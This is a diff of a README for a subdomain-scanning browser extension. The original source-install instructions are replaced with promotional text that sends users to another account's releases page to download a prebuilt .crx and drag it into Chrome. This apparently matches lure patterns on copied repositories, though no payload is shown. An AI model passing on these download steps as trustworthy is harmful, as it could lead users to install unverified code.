@@ -1,57 +1,76 @@
-# SubSpy 🔍
+# 🕵️‍♂️ SubSpy-Fast-Subdomain-Scanner- - Quickly Find Hidden Subdomains
 
+## 🚀 Getting Started
 
-SubSpy is a Chrome/Firefox extension that discovers subdomains of the website you are currently visiting. It uses a customizable wordlist and DNS over HTTPS (DoH) to scan efficiently.
+Welcome to SubSpy-Fast-Subdomain-Scanner-, the Chrome extension that helps you find subdomains of the current website using DNS over HTTPS. This tool is perfect for everyone, from beginners in cybersecurity to web developers who need a fast and efficient way to explore domains. Follow the steps below to download and run the extension.
 
-## Features
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23e67e22?style=for-the-badge&logo=github&logoColor=white)](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/releases)
 
-- 🚀 One-click scan of the active tab's domain  
-- 📂 Use built-in or upload your own wordlist  
-- ⏸️ Pause / ▶️ Resume / ⏹️ Stop scans  
-- 📊 Real-time progress & found subdomain count  
-- 📥 Export results as `.txt`  
-- 🖱️ Click to copy subdomains  
+## 📥 Download & Install
 
-## Installation
+1. **Visit the Releases Page**  
+   To download the latest version of SubSpy-Fast-Subdomain-Scanner-, click the link below:  
+   [Download Here](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/releases)
 
-### Chrome
+2. **Choose the Correct File**  
+   Once you are on the releases page, look for the latest version. You will see a list of files. Select the file suitable for your system. For example, you might see a `.crx` file for Chrome.
 
-```bash
-git clone https://github.com/ghaziwali/SubSpy.git
-```
+3. **Download the File**  
+   Click on the file link to start the download. Depending on your browser settings, it will either save automatically or prompt you to choose a location.
 
-1. Open Chrome → Extensions → Load unpacked
-2. Select the SubSpy folder
+4. **Install the Extension**  
+   After the download completes, follow these steps:  
+   - Open Chrome and go to `chrome://extensions/`.  
+   - Enable "Developer mode" at the top right.  
+   - Drag and drop the downloaded file into the Extensions page.  
 
-### Firefox
+5. **Pin the Extension**  
+   Once installed, find the SubSpy icon on your toolbar. Click it to pin the extension for easy access.
 
-1. Rename `manifest-firefox.json` to `manifest.json` in the SubSpy folder
-2. Add this polyfill at the top of `popup.js` so Firefox recognizes Chrome APIs:
+6. **Start Scanning**  
+   To find subdomains, navigate to a website. Click on the SubSpy icon to initiate the scan. The results will display hidden subdomains that may enhance your website reconnaissance tasks.
 
-```javascript
-// Polyfill so browser.* works in Firefox
-if (typeof browser === "undefined") {
-  var browser = chrome;
-}
-```
+## 🛠 Features
 
-3. Open Firefox → `about:debugging` → This Firefox → Load Temporary Add-on
-4. Select the Firefox manifest
+- **Easy Installation**: Quick setup with clear steps.
+- **Fast Scanning**: Discover hidden subdomains in seconds.
+- **User-Friendly Interface**: Designed for non-technical users for seamless navigation.
+- **Privacy Focus**: Uses DNS over HTTPS to protect your queries.
+- **Real-Time Updates**: Stay current with the latest web security findings.
 
-⚠️ **Note:** Firefox does not fully support MV3 service workers. All scanning logic runs from the popup.
+## 📊 System Requirements
 
-## Usage
+- **Browser**: Google Chrome (latest version is preferred)
+- **Operating System**: Windows, macOS, or Linux
+- **Internet Connection**: Required for scanning and fetching data
 
-1. Navigate to a website you want to scan
-2. Click the SubSpy icon in your browser toolbar
-3. Click **Scan** to start scanning subdomains
-4. Pause, resume, or stop scans as needed
-5. Export found subdomains using the **Download** button
-6. Click individual subdomains to copy them to your clipboard
+## 🔍 How to Use
 
+1. **Launch the Extension**  
+   Click on the SubSpy icon in your Chrome toolbar while visiting any website.
 
-## Contributing
+2. **Run the Scan**  
+   The extension will automatically scan the active tab's domain for subdomains. Wait for the results to show on your screen.
 
-Contributions are welcome!
+3. **View Results**  
+   You will see a list of subdomains. Clicking on any subdomain will open that site in a new tab.
 
-Please open an issue or submit a pull request if you want to add features, fix bugs, or improve documentation.
+## 🔧 Troubleshooting
+
+### Common Issues
+
+- **Extension Doesn't Show**: Ensure it is correctly installed. Check `chrome://extensions/` to see if it is enabled.
+- **No Results Found**: Make sure the active tab is a valid website. Refresh the page if needed.
+- **Permissions Denied**: Ensure that Chrome allows extensions.
+
+### Support
+
+For further assistance, feel free to check out our [GitHub Issues page](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/issues).
+
+## 🌐 Community and Contribution
+
+We welcome contributions! If you want to suggest features, report bugs, or help improve the project, please visit our [Contribution Guidelines](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/CONTRIBUTING.md).
+
+Thank you for choosing SubSpy-Fast-Subdomain-Scanner-. We hope this tool enhances your web exploration experience! 
+
+[Download Here](https://github.com/YHH306/SubSpy-Fast-Subdomain-Scanner-/releases)
